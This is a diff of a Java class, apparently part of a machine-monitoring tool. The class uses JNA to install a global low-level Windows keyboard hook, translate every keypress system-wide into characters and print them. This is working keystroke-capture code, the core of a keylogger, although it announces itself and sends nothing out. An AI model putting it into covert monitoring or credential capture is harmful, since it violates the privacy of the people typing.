@@ -1,8 +1,8 @@
 package machineguardianmonitorprotect.core;
 
+import com.sun.jna.Native;
 import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
-import com.sun.jna.platform.win32.WinDef;
 import com.sun.jna.platform.win32.WinDef.HMODULE;
 import com.sun.jna.platform.win32.WinDef.LRESULT;
 import com.sun.jna.platform.win32.WinDef.WPARAM;
@@ -14,57 +14,78 @@ import com.sun.jna.platform.win32.WinUser.MSG;
 
 public class KeyboardHook {
 
-    private static volatile boolean quit;
-    private static HHOOK hhk;
-    private static LowLevelKeyboardProc keyboardHook;
+    private volatile boolean quit;
+    private HHOOK hHook;
+    private LowLevelKeyboardProc keyboardHookCallback;
+    private int VK_RETURN = 0x0D;
+    private HMODULE hModule;
+    private User32 user32;
+    private MyUser32 myUser32;
 
-    public static void main(String[] args) {
-        final User32 lib = User32.INSTANCE;
-        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
-        keyboardHook = new LowLevelKeyboardProc() {
+    public KeyboardHook() {
+        user32 = User32.INSTANCE;
+        myUser32 = (MyUser32) Native.loadLibrary("user32", MyUser32.class);
+        hModule = Kernel32.INSTANCE.GetModuleHandle(null);
+    }
+
+    public void capturarTeclasDigitadas() {
+        keyboardHookCallback = new LowLevelKeyboardProc() {
+
             public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                 if (nCode >= 0) {
-                    switch(wParam.intValue()) {
-                    case WinUser.WM_KEYUP:
-                    case WinUser.WM_KEYDOWN:
-                    case WinUser.WM_SYSKEYUP:
-                    case WinUser.WM_SYSKEYDOWN:
-                        System.err.println("in callback, key=" + info.vkCode);
-                        if (info.vkCode == 81) {
-                            quit = true;
-                        }
+                    switch (wParam.intValue()) {
+                        case WinUser.WM_KEYDOWN:
+                            System.err.println("in callback, key=" + info.vkCode);
+                            if (info.vkCode == 81) {
+                                quit = true;
+                            }
+                            char[] tecla = new char[10];
+                            byte[] keystate = new byte[256];
+                            User32.INSTANCE.GetKeyboardState(keystate); 
+                            myUser32.ToUnicodeEx(info.vkCode, wParam.intValue(), keystate, tecla, tecla.length, 0, myUser32.GetKeyboardLayout(0));
+                            System.out.println("Char: " + String.valueOf(tecla));
+
+                            if (info.vkCode == VK_RETURN) {
+                                System.out.println("ENTER");
+                                //System.out.println("Char: " + Character.toString((char)info.vkCode));
+                            }
+                            
                     }
                 }
-                return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
+                
+                return user32.CallNextHookEx(hHook, nCode, wParam, info.getPointer());
             }
         };
-        hhk = lib.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
+
+        hHook = user32.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHookCallback, hModule, 0);
         System.out.println("Keyboard hook installed, type anywhere, 'q' to quit");
         new Thread() {
+
             public void run() {
                 while (!quit) {
-                    try { Thread.sleep(10); } catch(Exception e) { }
+                    try {
+                        Thread.sleep(10);
+                    } catch (Exception e) {
+                    }
                 }
                 System.err.println("unhook and exit");
-                lib.UnhookWindowsHookEx(hhk);
+                user32.UnhookWindowsHookEx(hHook);
                 System.exit(0);
             }
         }.start();
 
-        // This bit never returns from GetMessage
         int result;
         MSG msg = new MSG();
-        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
+        while ((result = user32.GetMessage(msg, null, 0, 0)) != 0) {
             if (result == -1) {
                 System.err.println("error in get message");
                 break;
-            }
-            else {
+            } else {
                 System.err.println("got message");
-                lib.TranslateMessage(msg);
-                lib.DispatchMessage(msg);
+                user32.TranslateMessage(msg);
+                user32.DispatchMessage(msg);
             }
         }
-        lib.UnhookWindowsHookEx(hhk);
+        user32.UnhookWindowsHookEx(hHook);
     }
 }
